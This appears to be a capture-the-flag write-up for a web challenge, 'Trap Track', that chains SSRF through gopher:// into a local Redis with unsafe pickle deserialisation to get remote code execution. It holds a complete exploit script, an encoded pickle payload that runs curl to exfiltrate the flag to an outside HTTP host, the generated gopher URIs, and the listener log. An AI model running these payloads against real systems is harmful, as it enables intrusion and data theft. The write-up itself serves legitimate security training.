# [Web - hard] Trap Track

This webapp is written in Python, and has a Redis cache to store information. It accepts URIs as input and will perform a Python `request()` via regular Jobs on the given URI to check if the endpoint responds, like a healthcheck.

The vulnerabilities are:

- the URI given to `request()` is not validated. It can be any URI scheme, even using `gopher://127.0.0.1:6379` to interact with Redis
```python
def run_worker():
    job = get_work_item()
    if not job:
        return
    incr_field(job, 'inprogress')
    trapURL = job['trap_url']
    response = request(trapURL)
```
- the Jobs are stored in Redis serialized, then deserialized with `pickle.loads`. Creating a specially crafted `pickle` job will lead to a RCE
```python
def get_work_item():
    job_id = store.rpop(env('REDIS_QUEUE'))
    if not job_id:
        return False
    data = store.hget(env('REDIS_JOBS'), job_id)
    job = pickle.loads(base64.b64decode(data))
```

In order to get the flag, we need to:

- login as admin/admin (that's given)
- generate a `pickle` serialized payload, leading the an RCE, in order to exfiltrate the flag to an HTTP listener
- generate the Redis commands equivalent to storing a new Job in Redis so that the specially crafted serialized payload is executed as any Job, using the `gopher://127.0.0.1:6379` URIs. Especially the ID should not mangle the original ID and be in sequence with the rest

The final script doesn't automate the whole process, but it gives the 2 Redis commands to input, given the last Job ID seen. Inputing those 2 commands, will trigger the Jobs to exfiltrate the flag to a remote HTTP server.

```python
import requests
import urllib
import pickle, os, base64
import sys

payload = 'curl http://1.2.3.4:4444/$(/readflag)'

class P(object):
    def __reduce__(self):
        return (os.system,(payload,))

def generate_resp(command):
    res = ""
    if isinstance(command, list):
        pass
    else:
        command = command.split(" ")
    res += "*{}\n".format(len(command))
    for cmd in command:
        res += "${}\n".format(len(cmd))
        res += "{}\n".format(cmd)
    return res

def generate_gopher(payload):
    final_payload = "gopher://127.0.0.1:6379/_{}".format(urllib.parse.quote(payload))
    return final_payload

def main(last_job_id_seen):
    job_id = last_job_id_seen + 3 # current job + 1 for HSET + 1 for RPUSH + 1 for correct place
    exploit = base64.b64encode(pickle.dumps(P())).decode('utf8')
    redis_cmd_1 = 'HSET jobs {} {}'.format(job_id, exploit)
    redis_cmd_2 = 'RPUSH jobqueue {}'.format(job_id)

    res = ''
    res += generate_resp(redis_cmd_1)
    res += generate_resp('quit')
    res = res.replace("\n","\r\n")
    gopher_cmd = generate_gopher(res)
    print(gopher_cmd)

    res = ''
    res += generate_resp(redis_cmd_2)
    res += generate_resp('quit')
    res = res.replace("\n","\r\n")
    gopher_cmd = generate_gopher(res)
    print(gopher_cmd)

if len(sys.argv) != 2:
    print("Usage: {} last_job_id".format(sys.argv[0]))
    exit(1)
main(int(sys.argv[1]))
```

The output (2 commands to input), given that the first JobID is 100, are:

```bash
$ python lol.py 100
gopher://127.0.0.1:6379/_%2A4%0D%0A%244%0D%0AHSET%0D%0A%244%0D%0Ajobs%0D%0A%243%0D%0A103%0D%0A%24100%0D%0AgASVQAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCVjdXJsIGh0dHA6Ly8xLjIuMy40OjQ0NDQvJCgvcmVhZGZsYWcplIWUUpQu%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A
gopher://127.0.0.1:6379/_%2A3%0D%0A%245%0D%0ARPUSH%0D%0A%248%0D%0Ajobqueue%0D%0A%243%0D%0A103%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A
```

After copy pasting them in the console, from the HTTP listener:

```bash
pi@raspberrypi:/tmp/lol $ python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
165.22.116.7 - - [25/Mar/2023 08:31:10] code 404, message File not found
165.22.116.7 - - [25/Mar/2023 08:31:10] "GET /HTBtr4p_qu3u3d_t0_rc3! HTTP/1.1" 404 -
```
